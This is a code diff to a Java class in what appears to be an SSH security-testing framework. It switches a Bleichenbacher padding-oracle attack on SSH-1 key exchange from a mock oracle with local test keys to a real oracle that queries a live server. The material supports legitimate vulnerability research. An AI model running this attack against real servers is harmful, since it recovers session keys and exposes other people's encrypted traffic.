@@ -15,13 +15,12 @@ import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
 import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
 import de.rub.nds.sshattacker.attacks.general.ParallelExecutor;
 import de.rub.nds.sshattacker.attacks.pkcs1.*;
-import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Ssh1MockOracle;
+import de.rub.nds.sshattacker.attacks.pkcs1.oracles.BleichenbacherOracle;
 import de.rub.nds.sshattacker.attacks.response.EqualityError;
 import de.rub.nds.sshattacker.core.config.Config;
 import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.sshattacker.core.crypto.cipher.AbstractCipher;
 import de.rub.nds.sshattacker.core.crypto.cipher.CipherFactory;
-import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPrivateKey;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.exceptions.CryptoException;
@@ -29,7 +28,6 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.math.BigInteger;
-import java.security.InvalidKeyException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.security.interfaces.RSAPublicKey;
@@ -37,7 +35,6 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Random;
-import javax.crypto.NoSuchPaddingException;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -243,7 +240,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                                         + "871890105EFFE1193F",
                                 16));*/
 
-        // Host 1024
+        /*// Host 1024
         CustomRsaPublicKey hostPublicKey =
                 new CustomRsaPublicKey(
                         new BigInteger("010001", 16),
@@ -314,16 +311,15 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                                         + "27DB0768AB643AD09A7C42C6AD47DA"
                                         + "ACE6CD53C051E26E69AF472D0CFE17"
                                         + "322EC96499E529",
-                                16));
+                                16));*/
         /*if (!isVulnerable()) {
             LOGGER.warn("The server is not vulnerable to Manger's attack");
             return;
         }*/
 
-        /*getPublicKeys();
-                getHostPublicKey();
-                getServerPublicKey();
-        */
+        getPublicKeys();
+        getHostPublicKey();
+        getServerPublicKey();
         byte[] encryptedSecret;
         if (config.isBenchmark()) {
             LOGGER.info("Running in Benchmark Mode, generating encrypted Session Key");
@@ -331,11 +327,6 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             Random random = new Random();
             byte[] sessionKey = new byte[32];
             random.nextBytes(sessionKey);
-            /*
-
-                        ArrayConverter.hexStringToByteArray(
-                                "d8e96a8f2facb6536f078bcee655df3bffcc4da14c45c35d6e66813a097867f6");
-            */
 
             AbstractCipher innerEncryption;
             AbstractCipher outerEncryption;
@@ -374,22 +365,22 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             throw new RuntimeException(e);
         }
 
-        Ssh1MockOracle oracle = null;
+        /*        Ssh1MockOracle oracle = null;
         try {
             oracle =
                     new Ssh1MockOracle(
                             hostPublicKey, hostPrivatKey, serverPublicKey, serverPrivateKey);
         } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException e) {
             throw new RuntimeException(e);
-        }
+        }*/
 
-        /*BleichenbacherOracle oracle =
-        new BleichenbacherOracle(
-                this.hostPublicKey,
-                this.serverPublicKey,
-                getSshConfig(),
-                counterInnerBleichenbacher,
-                counterOuterBleichenbacher);*/
+        BleichenbacherOracle oracle =
+                new BleichenbacherOracle(
+                        this.hostPublicKey,
+                        this.serverPublicKey,
+                        getSshConfig(),
+                        counterInnerBleichenbacher,
+                        counterOuterBleichenbacher);
 
         Bleichenbacher attacker =
                 new Bleichenbacher(encryptedSecret, oracle, hostPublicKey, serverPublicKey);
@@ -407,8 +398,6 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 attacker.getCounterInnerBleichenbacher(),
                 attacker.getCounterOuterBleichenbacher());
         BigInteger solution = attacker.getSolution();
-
-        // Trasfer big-Integer back to byte-array, remove leading 0 if present.
 
         byte[] solutionByteArray = ArrayConverter.bigIntegerToByteArray(solution);
 
@@ -435,7 +424,7 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                                         + "  \"Outer-Tries\": \"%d\","
                                         + "  \"serverkey_lenght\": \"%d\","
                                         + "  \"hostkey_lenght\": \"%d\","
-                                        + "  \"oracle_type\": \"strong\""
+                                        + "  \"oracle_type\": \"real\""
                                         + "}",
                                 ArrayConverter.bytesToHexString(solutionByteArray),
                                 ArrayConverter.bytesToHexString(encryptedSecret),
